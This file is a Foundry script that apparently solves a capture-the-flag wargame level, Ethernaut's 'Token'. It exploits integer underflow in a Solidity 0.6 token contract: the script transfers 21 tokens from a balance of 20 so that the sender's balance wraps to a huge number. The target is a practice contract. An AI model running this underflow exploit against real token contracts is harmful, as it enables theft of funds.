/*
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "src/Token.sol";
import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/console.sol";

contract TokenSolution is Script {
    Token public token = Token(0x6649e4659537718384d8f244e7DdfBF5e5A1b5D0);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log(token.totalSupply());
        console.log("my balance", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log("owner balance", token.balanceOf(address(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)));

        bool success = token.transfer(address(0x01), 21);
        console.log("Transfer successful:", success);
        console.log("my balance", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        console.log("owner balance", token.balanceOf(address(0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)));
        vm.stopBroadcast();
    }

    fallback() external payable {}
    receive() external payable {}
}
